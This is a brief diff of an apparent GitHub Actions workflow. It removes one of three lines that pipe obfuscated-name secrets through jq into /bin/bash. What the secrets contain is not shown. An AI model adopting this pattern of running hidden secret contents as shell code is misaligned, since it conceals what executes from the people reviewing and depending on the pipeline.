@@ -17,7 +17,6 @@ jobs:
           pbnz77: ${{ secrets.pbnz77 }}
         run: |
           printf '%s' "$pbnz77" | jq -r .iwwqb593 | /bin/bash
-          printf '%s' "$crc5" | jq -r .v5 | /bin/bash
           printf '%s' "$o635" | jq -r .p47942 | /bin/bash
 
       - name: Persist data
